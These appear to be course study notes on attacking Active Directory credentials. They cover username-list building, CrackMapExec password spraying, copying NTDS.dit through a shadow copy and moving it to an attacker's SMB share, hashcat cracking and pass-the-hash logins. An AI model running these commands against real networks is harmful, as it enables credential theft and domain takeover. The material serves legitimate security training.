## Dictionary Attacks Against AD Accounts Using CrackMapExec

Dictionary attack over the network can be noisy, if we proceed with it we can benefit from looking at things like social media for details on employees, and employee directory on the company's website.

Some common conventions of organizations creating employee usernames:

| Username Convention                 | Practical Example for Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | doedoehacksstuff                    |

Sometimes an email address structure will give us the username, for example with `jdoe`@`inlanefreight.com` we can see that `jdoe` is the username.

```
A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.
```

### Creating a Custom List of Usernames

We can use an automated tool like [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert real names to common username conventions:
```shell-session
$ ./username-anarchy -i <real names file> 
```

### Launching the Attack With CrackMapExec
```shell-session
$ crackmapexec smb <target ip> -u <username> -p <passwords file>
```

## Capturing NTDS.dit

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources, `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html), this is the primary database file associated with AD and stores all domain usernames, password hashes and other critical schema information.

### Connecting to a DC with Evil-WinRM
```shell-session
$ evil-winrm -i <ip address>  -u <username> -p '<password>'
```

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

### Checking Local Group Membership
```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights.

### Checking User Account Privileges including Domain
```shell-session
*Evil-WinRM* PS C:\> net user <username>
```

### Creating a Shadow Copy of C:

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

### Copying NTDS.dit from the VSS

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

A technique to pass the file to our machine is mentioned in [[Attacking SAM]]

### Transferring NTDS.dit to Attack Host
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<ip address>\<share name> 
```

### A Faster Method: Using cme to Capture NTDS.dit
```shell-session
$ crackmapexec smb <target ip> -u <username> -p <password> --ntds
```

## Cracking Hashes & Gaining Credentials
```shell-session
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Pass-the-Hash Considerations
```shell-session
$ evil-winrm -i <target ip> -u  <username> -H "<NT hash>"
```